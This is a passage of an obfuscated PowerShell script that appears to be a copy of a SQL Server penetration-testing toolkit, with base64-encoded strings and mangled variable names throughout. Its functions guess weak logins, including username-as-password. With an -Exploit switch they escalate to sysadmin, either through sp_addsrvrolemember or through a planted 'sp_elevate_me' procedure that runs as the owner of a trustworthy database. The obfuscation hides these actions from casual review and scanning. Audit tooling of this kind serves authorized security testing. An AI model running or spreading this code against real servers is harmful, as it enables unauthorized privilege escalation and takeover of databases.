                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAWQBvAHUAJwByAGUAIABuAG8AdAAgAGMAdQByAHIAZQBuAHQAbAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATABlAHQAJwBzACAAYwBoAGEAbgBnAGUAIAB0AGgAYQB0AC4ALgAuAA==')))
                            Get-SQLQuery -Instance $Instance -Username ${__/\/===\/==\__/=} -Password ${__/\___/==\/\_/\/} -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwA='))) -SuppressVerbose
                            ${_/=\__/=\_/=\/\/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            select -Property IsSysadmin -ExpandProperty IsSysadmin
                            if(${_/=\__/=\_/=\/\/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                            {
                                ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUwBVAEMAQwBFAFMAUwAhACAAWQBvAHUAJwByAGUAIABhACAAcwB5AHMAYQBkAG0AaQBuACAAbgBvAHcALgA=')))
                            }
                            else
                            {
                                ${__/\/\_/==\/==\/\} = 'No'
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARgBhAGkAbAAuACAAVwBlACAAYwBvAHUAZABuACcAdAAgAGEAZABkACAAeQBvAHUAIABhAHMAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                        }
                    }
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAkAHsAXwBfAC8AXAAvAD0APQA9AFwALwA9AD0AXABfAF8ALwA9AH0AIAAoACQAewBfAF8ALwA9AFwALwA9AFwALwBcAF8ALwBcAF8AXwBfAF8AfQApACAAaQBzACAAYwBvAG4AZgBpAGcAdQByAGUAZAAgAHcAaQB0AGgAIAB0AGgAZQAgAHAAYQBzAHMAdwBvAHIAZAAgACQAewBfAF8ALwBcAF8AXwBfAC8APQA9AFwALwBcAF8ALwBcAC8AfQAuAA==')))
                    ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARgBhAGkAbABlAGQAIABMAG8AZwBpAG4AOgAgAFUAcwBlAHIAIAA9ACAAJAB7AF8AXwAvAFwALwA9AD0APQBcAC8APQA9AFwAXwBfAC8APQB9ACAAUABhAHMAcwB3AG8AcgBkACAAPQAgACQAewBfAF8ALwBcAF8AXwBfAC8APQA9AFwALwBcAF8ALwBcAC8AfQA=')))
                }
            }
        }
        if(-not $NoUserAsPass)
        {
            ${____/=\__/=\/===\} |
            select -Unique |
            % -Process {
                ${__/\/===\/==\__/=} = $_
                ${_/======\_____/\_} = Get-SQLConnectionTest -Instance $Instance -Username ${__/\/===\/==\__/=} -Password ${__/\/===\/==\__/=} -SuppressVerbose |
                ? -FilterScript {
                    $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
                }
                if(${_/======\_____/\_})
                {
                    ${__/\_/\__/==\/\_/} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username ${__/\/===\/==\__/=} -Password ${__/\/===\/==\__/=} -SuppressVerbose |
                    select -Property IsSysadmin -ExpandProperty IsSysadmin
                    if(${__/\_/\__/==\/\_/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        ${__/=\/=\/\_/\____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAYQBkAG0AaQBuAA==')))
                    }
                    else
                    {
                        ${__/=\/=\/\_/\____} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIABTAHkAcwBhAGQAbQBpAG4A')))
                    }
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUwB1AGMAYwBlAHMAcwBmAHUAbAAgAEwAbwBnAGkAbgA6ACAAVQBzAGUAcgAgAD0AIAAkAHsAXwBfAC8AXAAvAD0APQA9AFwALwA9AD0AXABfAF8ALwA9AH0AIAAoACQAewBfAF8ALwA9AFwALwA9AFwALwBcAF8ALwBcAF8AXwBfAF8AfQApACAAUABhAHMAcwB3AG8AcgBkACAAPQAgACQAewBfAF8ALwBcAC8APQA9AD0AXAAvAD0APQBcAF8AXwAvAD0AfQA=')))
                    if(($Exploit) -and ${__/\_/\__/==\/\_/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        ${/=====\/=\/\/\/\/} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        select -Property IsSysadmin -ExpandProperty IsSysadmin
                        if(${/=====\/=\/\/\/\/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAWQBvAHUAJwByAGUAIABhAGwAcgBlAGEAZAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATgBvAHQAaABpAG4AZwAgAHQAbwAgAGQAbwAuAA==')))
                        }
                        else
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAWQBvAHUAJwByAGUAIABuAG8AdAAgAGMAdQByAHIAZQBuAHQAbAB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuACAATABlAHQAJwBzACAAYwBoAGEAbgBnAGUAIAB0AGgAYQB0AC4ALgAuAA==')))
                            Get-SQLQuery -Instance $Instance -Username ${__/\/===\/==\__/=} -Password ${__/\/===\/==\__/=} -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwA='))) -SuppressVerbose
                            ${_/\/\___/=\/\/\/=} = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            select -Property IsSysadmin -ExpandProperty IsSysadmin
                            if(${_/\/\___/=\/\/\/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                            {
                                ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAAUwBVAEMAQwBFAFMAUwAhACAAWQBvAHUAJwByAGUAIABhACAAcwB5AHMAYQBkAG0AaQBuACAAbgBvAHcALgA=')))
                            }
                            else
                            {
                                ${__/\/\_/==\/==\/\} = 'No'
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARgBhAGkAbAAuACAAVwBlACAAYwBvAHUAZABuACcAdAAgAGEAZABkACAAeQBvAHUAIABhAHMAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
                            }
                        }
                    }
                    ${/=\/=\_/\/\/\/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAkAHsAXwBfAC8AXAAvAD0APQA9AFwALwA9AD0AXABfAF8ALwA9AH0AIAAoACQAewBfAF8ALwA9AFwALwA9AFwALwBcAF8ALwBcAF8AXwBfAF8AfQApACAAcAByAGkAbgBjAGkAcABhAGwAIABpAHMAIABjAG8AbgBmAGkAZwB1AHIAZQBkACAAdwBpAHQAaAAgAHQAaABlACAAcABhAHMAcwB3AG8AcgBkACAAJAB7AF8AXwAvAFwALwA9AD0APQBcAC8APQA9AFwAXwBfAC8APQB9AC4A')))
                    ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
                }
                else
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAAtACAARgBhAGkAbABlAGQAIABMAG8AZwBpAG4AOgAgAFUAcwBlAHIAIAA9ACAAJAB7AF8AXwAvAFwALwA9AD0APQBcAC8APQA9AFwAXwBfAC8APQB9ACAAUABhAHMAcwB3AG8AcgBkACAAPQAgACQAewBfAF8ALwBcAC8APQA9AD0AXAAvAD0APQBcAF8AXwAvAD0AfQA=')))
                }
            }
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABXAGUAYQBrACAATABvAGcAaQBuACAAUABhAHMAcwB3AG8AcgBkAA==')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_} | sort -Property computername, instance, details
        }
    }
}
Function Invoke-SQLAuditRoleDbOwner
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAARABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBPAFcATgBFAFIA')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABEAEEAVABBAEIAQQBTAEUAIABSAE8ATABFACAALQAgAEQAQgBfAE8AVwBOAEUAUgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMA')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        ${_/\_/===\___/\/\_} = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName ${/=\_/==\__/\/\_/=}  -SuppressVerbose
        ${___/\/\/=\/=\_/=\} = @()
        ${___/\/\/=\/=\_/=\} += ${/=\_/==\__/\/\_/=}
        ${___/\/\/=\/=\_/=\} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))
        ${_/\_/===\___/\/\_} | % -Process {
            ${___/\/\/=\/=\_/=\} += $_.RolePrincipalName
        }
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABBAFQAQQBCAEEAUwBFACAAUgBPAEwARQAgAC0AIABEAEIAXwBPAFcATgBFAFIA')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABsAG8AZwBpAG4AIABoAGEAcwAgAHQAaABlACAARABCAF8ATwBXAEUAUgAgAHIAbwBsAGUAIABpAG4AIABvAG4AZQAgAG8AcgAgAG0AbwByAGUAIABkAGEAdABhAGIAYQBzAGUAcwAuACAAIABUAGgAaQBzACAAbQBhAHkAIABhAGwAbABvAHcAIAB0AGgAZQAgAGwAbwBnAGkAbgAgAHQAbwAgAGUAcwBjAGEAbABhAHQAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABzAHkAcwBhAGQAbQBpAG4AIABpAGYAIAB0AGgAZQAgAGEAZgBmAGUAYwB0AGUAZAAgAGQAYQB0AGEAYgBhAHMAZQBzACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAYQBuAGQAIABvAHcAbgBlAGQAIABiAHkAIABhACAAcwB5AHMAYQBkAG0AaQBuAC4A')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBmACAAdABoAGUAIABwAGUAcgBtAGkAcwBzAGkAbwBuACAAaQBzACAAbgBvAHQAIAByAGUAcQB1AGkAcgBlAGQAIAByAGUAbQBvAHYAZQAgAGkAdAAuACAAIABQAGUAcgBtAGkAcwBzAGkAbwBuAHMAIABhAHIAZQAgAGcAcgBhAG4AdABlAGQAIAB3AGkAdABoACAAYQAgAGMAbwBtAG0AYQBuAGQAIABsAGkAawBlADoAIABFAFgARQBDACAAcwBwAF8AYQBkAGQAcgBvAGwAZQBtAGUAbQBiAGUAcgAgACcARABCAF8ATwBXAE4ARQBSACcALAAgACcATQB5AEQAYgBVAHMAZQByACcALAAgAGEAbgBkACAAYwBhAG4AIABiAGUAIAByAGUAbQBvAHYAZQBkACAAdwBpAHQAaAAgAGEAIABjAG8AbQBtAGEAbgBkACAAbABpAGsAZQA6ACAAIABFAFgARQBDACAAcwBwAF8AZAByAG8AcAByAG8AbABlAG0AZQBtAGIAZQByACAAJwBEAEIAXwBPAFcATgBFAFIAJwAsACAAJwBNAHkARABiAFUAcwBlAHIAJwA=')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        if($Username)
        {
            ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIATwB3AG4AZQByACAALQBJAG4AcwB0AGEAbgBjAGUAIAAkAEkAbgBzAHQAYQBuAGMAZQAgAC0AVQBzAGUAcgBuAGEAbQBlACAAJABVAHMAZQByAG4AYQBtAGUAIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAUABhAHMAcwB3AG8AcgBkACAALQBFAHgAcABsAG8AaQB0AA==')))
        }
        else
        {
            ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQAUgBvAGwAZQBEAGIATwB3AG4AZQByACAALQBJAG4AcwB0AGEAbgBjAGUAIAAkAEkAbgBzAHQAYQBuAGMAZQAgAC0ARQB4AHAAbABvAGkAdAA=')))
        }
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${_/=\_/==\_/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBmAGYAZQBjAHQAZQBkACAAZABhAHQAYQBiAGEAcwBlAHMAIABtAHUAcwB0ACAAYgBlACAAbwB3AG4AZQBkACAAYgB5ACAAYQAgAHMAeQBzAGEAZABtAGkAbgAgAGEAbgBkACAAYgBlACAAdAByAHUAcwB0AGUAZAAuAA==')))
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAG0AcwBkAG4ALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AZQBuAC0AdQBzAC8AbABpAGIAcgBhAHIAeQAvAG0AcwAxADgAOQAxADIAMQAuAGEAcwBwAHgALABoAHQAdABwAHMAOgAvAC8AbQBzAGQAbgAuAG0AaQBjAHIAbwBzAG8AZgB0AC4AYwBvAG0ALwBlAG4ALQB1AHMALwBsAGkAYgByAGEAcgB5AC8AbQBzADEAOAA3ADgANgAxAC4AYQBzAHAAeAA=')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${___/\/\/=\/=\_/=\}|
        % -Process {
            ${/==\_/=\_/\_/\/=\} = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_OWNER -PrincipalName $_ -SuppressVerbose
            if(${/==\_/=\_/\_/\/=\})
            {
                ${/==\_/=\_/\_/\/=\}|
                % -Process {
                    ${__/\/=\/\__/=\_/\} = $_.DatabaseName
                    ${/===\_/===\/=\/==} = $_.PrincipalName
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AFwAXwAvAD0APQA9AFwALwA9AFwALwA9AD0AfQAgAGgAYQBzACAAdABoAGUAIABEAEIAXwBPAFcATgBFAFIAIAByAG8AbABlACAAaQBuACAAdABoAGUAIAAkAHsAXwBfAC8AXAAvAD0AXAAvAFwAXwBfAC8APQBcAF8ALwBcAH0AIABkAGEAdABhAGIAYQBzAGUALgA=')))
                    ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                    ${/====\__/\______/} = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName ${__/\/=\/\__/=\_/\} -SuppressVerbose | ? -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }
                    if(${/====\__/\______/})
                    {
                        ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAJAB7AF8AXwAvAFwALwA9AFwALwBcAF8AXwAvAD0AXABfAC8AXAB9ACAAZABhAHQAYQBiAGEAcwBlACAAaQBzACAAcwBlAHQAIABhAHMAIAB0AHIAdQBzAHQAdwBvAHIAdABoAHkAIABhAG4AZAAgAGkAcwAgAG8AdwBuAGUAZAAgAGIAeQAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALgAgAFQAaABpAHMAIABpAHMAIABlAHgAcABsAG8AaQB0AGEAYgBsAGUALgA=')))
                        if($Exploit)
                        {
                            ${_/=\/=====\/=\/=\} = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABJAFMAXwBTAFIAVgBSAE8ATABFAE0ARQBNAEIARQBSACgAJwBzAHkAcwBhAGQAbQBpAG4AJwAsACcAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACcAKQAgAGEAcwAgAFMAdABhAHQAdQBzAA=='))) -SuppressVerbose | select -Property Status -ExpandProperty Status
                            if(${_/=\/=====\/=\/=\} -ne 1)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAFYAZQByAGkAZgBpAGUAZAAgAHQAaABhAHQAIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAKAAkAHsALwA9AFwAXwAvAD0APQBcAF8AXwAvAFwALwBcAF8ALwA9AH0AKQAgAGkAcwAgAE4ATwBUACAAYQAgAHMAeQBzAGEAZABtAGkAbgAuAA==')))
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAWABQAEwATwBJAFQASQBOAEcAOgAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABhAGQAZAAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAIAAoACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQApACAAdABvACAAdABoAGUAIABzAHkAcwBhAGQAbQBpAG4AIAByAG8AbABlACAAYgB5ACAAdQBzAGkAbgBnACAARABCAF8ATwBXAE4ARQBSACAAcABlAHIAbQBpAHMAcwBpAG8AbgBzAC4ALgAuAA==')))
                                ${/=\_/=======\_/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQAgAHMAcABfAGUAbABlAHYAYQB0AGUAXwBtAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASQBUAEgAIABFAFgARQBDAFUAVABFACAAQQBTACAATwBXAE4ARQBSAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAFMADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAZQBnAGkAbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQBYAEUAQwAgAHMAcABfAGEAZABkAHMAcgB2AHIAbwBsAGUAbQBlAG0AYgBlAHIAIAAnACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAnACwAJwBzAHkAcwBhAGQAbQBpAG4AJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbgBkADsA')))
